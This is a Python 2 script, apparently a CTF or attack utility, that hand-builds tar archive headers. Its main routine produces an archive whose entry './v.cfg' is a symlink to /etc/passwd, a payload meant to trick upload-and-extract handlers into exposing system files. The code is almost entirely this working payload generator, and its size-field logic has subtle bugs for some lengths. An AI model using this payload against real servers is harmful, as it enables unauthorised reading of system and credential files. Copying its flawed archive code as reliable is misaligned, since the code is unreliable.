#!/usr/bin/env python2
# coding=utf-8

import os
import tarfile

__info__ = {
    "desc": "Output a tar file by script",
    "version": "1.0",
    "usage": "tarfile filename content_name content_data"
}


def _tarfile(content_name=b'test.php', content_data=b'test', linkname=b''):
    if len(content_name) > 100:
        print 'content_name error'
        return
    t_name = bytearray(content_name + b'\x00' * (100 - len(content_name)))
    t_mode = b'0000664\x00'
    t_uid = b'0001750\x00'
    t_gid = b'0001750\x00'
    t_size = b'00000000004\x00'
    t_mtime = b'01274124644\x00'
    t_chksum = b''
    t_typeflag = b'2' if linkname else b'0'
    t_linkname = bytearray(linkname + b'\x00' * (100 - len(linkname)))
    t_magic = b'ustar\x32'
    t_version = '\x32\x00'
    t_uname = b'root' + b'\x00' * (32 - 4)
    t_gname = b'root' + b'\x00' * (32 - 4)
    t_devmajor = b'\x00' * 8
    t_devminor = b'\x00' * 8
    t_prefix = b'\x00' * 155
    t_padding = b'\x00' * 12
    t_block = content_data + b'\x00' * (512 - len(content_data))
    if len(content_data) < 1000:
        s = bytes(len(content_data))
        if len(content_data) > 0 and len(content_data) < 10:
            t_size = bytearray(b'0000000000' + s + b'\x00')
        elif len(content_data) > 10 and len(content_data) < 100:
            t_size = bytearray(b'000000000' + s + b'\x00')
        elif len(content_data) > 100:
            t_size = bytearray(b'00000000' + s + b'\x00')
        else:
            t_size = bytearray(b'0000000000' + s + b'\x00')
            # print('error')
            # return 0
    _a = bytearray(t_name + t_mode + t_uid + t_gid + t_size + t_mtime)
    _b = bytearray(t_typeflag + t_linkname + t_magic + t_version + t_uname +
                   t_gname + t_devmajor + t_devminor + t_prefix + t_padding)
    _t = bytearray(_a + _b)
    _sum = 0
    for j in str(_t):
        _sum += ord(j)
    t_chksum = bytearray(b'0' * (8 - len(bytes(oct(_sum + 256)))) +
                         bytes(oct(_sum + 256)))
    return bytearray(_a + t_chksum + _b + t_block + b'\x00' * 512)


def saveToFile(filename, tarData):
    f = open(filename, 'wb')
    f.write(tarData)
    f.close()


def run(fn, cn, cd, ln=b''):
    filename = fn + ".tar"
    content_name = cn or b"virink.txt"
    content_data = cd or b"virink"
    print 'Runing...'
    saveToFile(filename, _tarfile(
        bytes(content_name), bytes(content_data), ln))
    if os.path.exists(filename):
        print os.path.join("./", filename)
    else:
        print False

if __name__ == '__main__':
    run('test', b'./v.cfg', b'', b'/etc/passwd')
    if not tarfile.is_tarfile('./test.tar'):
        print('error')
    else:
        print('Success')
